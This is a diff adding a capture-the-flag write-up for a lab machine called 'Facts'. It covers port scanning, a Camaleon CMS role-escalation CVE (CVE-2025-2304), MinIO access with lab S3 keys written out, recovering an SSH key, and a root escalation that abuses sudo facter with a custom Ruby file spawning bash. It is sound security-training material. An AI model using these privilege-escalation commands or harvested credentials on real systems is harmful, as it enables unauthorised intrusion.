@@ -1,0 +1,218 @@
+---
+title: Facts
+published: 2026-02-01
+toc: true
+draft: false
+tags:
+  - MinIO
+  - facter
+  - CVE-2025-2304
+---
+
+import PasswordProtect from "~/components/PasswordProtect.client";
+
+```
+Scope:
+10.129.20.26
+```
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- -Pn -T5 --min-rate=5000 -vvvv facts.htb
+
+PORT      STATE SERVICE REASON  VERSION
+22/tcp    open  ssh     syn-ack OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
+|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
+80/tcp    open  http    syn-ack nginx 1.26.3 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: 8C83ADFFE48BE12C38E7DBCC2D0524BC
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.26.3 (Ubuntu)
+|_http-title: facts
+54321/tcp open  http    syn-ack Golang net/http server
+|_http-server-header: MinIO
+| http-methods: 
+|_  Supported Methods: GET OPTIONS
+|_http-title: Did not follow redirect to http://facts.htb:9001
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Accept-Ranges: bytes
+|     Content-Length: 303
+|     Content-Type: application/xml
+|     Server: MinIO
+|     Strict-Transport-Security: max-age=31536000; includeSubDomains
+|     Vary: Origin
+|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
+|     X-Amz-Request-Id: 188FE85264FAB013
+|     X-Content-Type-Options: nosniff
+|     X-Xss-Protection: 1; mode=block
+|     Date: Sat, 31 Jan 2026 19:43:39 GMT
+|     <?xml version="1.0" encoding="UTF-8"?>
+|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>188FE85264FAB013</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Accept-Ranges: bytes
+|     Content-Length: 276
+|     Content-Type: application/xml
+|     Server: MinIO
+|     Strict-Transport-Security: max-age=31536000; includeSubDomains
+|     Vary: Origin
+|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
+|     X-Amz-Request-Id: 188FE84E9E3B613B
+|     X-Content-Type-Options: nosniff
+|     X-Xss-Protection: 1; mode=block
+|     Date: Sat, 31 Jan 2026 19:43:22 GMT
+|     <?xml version="1.0" encoding="UTF-8"?>
+|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>188FE84E9E3B613B</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Vary: Origin
+|     Date: Sat, 31 Jan 2026 19:43:23 GMT
+|_    Content-Length: 0
+```
+
+<PasswordProtect client:load>
+
+## 80/TCP - HTTP
+
+![](attachments/8d043caf73d9d24b087136565961830c.png)
+
+### gobuster
+
+I then went ahead and used `gobuster` to enumerate the directories.
+
+![](attachments/38ab92859a5eaf3084dcdac90c919f99.png)
+
+I headed over and tried to log in but failed, so instead went to the `/register` tab where I registered for an account.
+
+![](attachments/591f9244c958fd6b8dde380edc07f1ed.png)
+
+![](attachments/038e13685a53169ae3537d331082e2b2.png)
+
+![](attachments/376d2f8ffa5ae38d6e0a6aae009346f1.png)
+
+Once inside I noticed at the bottom that it's running on **Camaleon CMS - 2.9.0**.
+
+### OSINT
+
+I went ahead and started looking around for exploits:
+
+![](attachments/064bc94c0aebec75e1707c5f5e87f53d.png)
+
+Delving deeper into it we find that the founder of this CVE posted a short informational writeup on [tenable](https://www.tenable.com/security/research/tra-2025-09):
+
+![](attachments/7e9dfb3fd1978e4c02a6d58dd291b5fb.png)
+
+### CVE-2025-2304
+
+So I head over and attempt to change the password, where I notice the **Role** is greyed out. 
+
+![](attachments/c444d592782c1e376171b424279328f3.png)
+
+Then using [this exploit](https://github.com/the8frust/CVE-2025-2304/blob/main/exploit.py) I was able to exploit the vulnerability inside the password change:
+
+![](attachments/c5a2038b2c8a88cecc66ae34982658a6.png)
+
+Logging back in we notice that we now have *Administrator* privileges.
+
+![](attachments/8163fdd0f995805e9bb5f9274952d00f.png)
+
+Heading over to the following page I found the AWS S3 info:
+
+![](attachments/9122d0c03735fc74ae512039b2c0ca1f.png)
+
+# Exploitation
+## MinIO cli
+
+In order to make use of this S3 bucket I downloaded `mc`:
+
+```bash
+wget https://dl.min.io/client/mc/release/linux-amd64/mc -O /usr/local/bin/mc && chmod +x /usr/local/bin/mc
+```
+
+Next up I created an alias:
+
+```bash
+mc alias set facts http://facts.htb:54321 AKIA8A8C1BCD91954B20 H6mMjKA49rX605mmBoJrrxURj8PIPRfb9EbuaIas
+```
+
+Once that was done I could issue commands: 
+
+![](attachments/ea34be076dc24f35c6280545bd7ff1f2.png)
+
+I decided to check out the `internal/` directory:
+
+![](attachments/45fb24d32e674d61d1f7ba7857c6d714.png)
+
+And lo and behold all the way at the bottom:
+
+![](attachments/69ebbff395f3898d1fe74e62fed9a1f3.png)
+
+I copied over the `ssh` key 
+
+![](attachments/4253637a050172da3dee2b60515bef44.png)
+
+I then tried to identify the user to which this key belonged to, but unfortunately the username wasn't listed in `authorized_keys`:
+
+![](attachments/4e9d254a5c23cb8d5b2c368d73c571e6.png)
+
+Shortly after I noticed that the `id_ed25519` key was actually encrypted with a passphrase, and I could decrypt it as follows:
+
+![](attachments/67aab125fd6dee385689c3327f0a31e8.png)
+
+![](attachments/fa16c9be3944b62f69b809305dbbbdae.png)
+
+# Foothold
+## Shell as trivia
+
+Combining all of the above we are able to log in: 
+
+![](attachments/6eeb0c01eb574895034ad17b3b19f25f.png)
+
+However the `user.txt` flag was not inside this user's `/home` directory, but rather in *william*'s. 
+Luckily for us though we have `read` privs over the flag.
+
+### user.txt
+
+![](attachments/2e3123690e63d28833ff8997219d17be.png)
+
+# Privilege Escalation
+## facter
+
+Checking out the `sudo` privs I find the following:
+
+![](attachments/3f84f20d8bb640bbcbcd3138c5275cef.png)
+
+using [GTFObins](https://gtfobins.org/gtfobins/facter/) I found the following:
+
+![](attachments/4affee574b8d3a198c31aa7d7fcf3d4b.png)
+
+We can get instant *root* privs by abusing this as follows:
+
+```bash
+mkdir /tmp/f
+echo 'exec "/bin/bash"' > /tmp/f/pwn.rb
+sudo facter --custom-dir=/tmp/f
+```
+
+![](attachments/1b8146162092b2fc352747870cd0ad19.png)
+
+### root.txt
+
+![](attachments/b928abfe51bc4708996a6113f5cfc803.png)
+
+![](attachments/f40390cd64654c593d5063eed31071de.png)
+
+</PasswordProtect>
+---
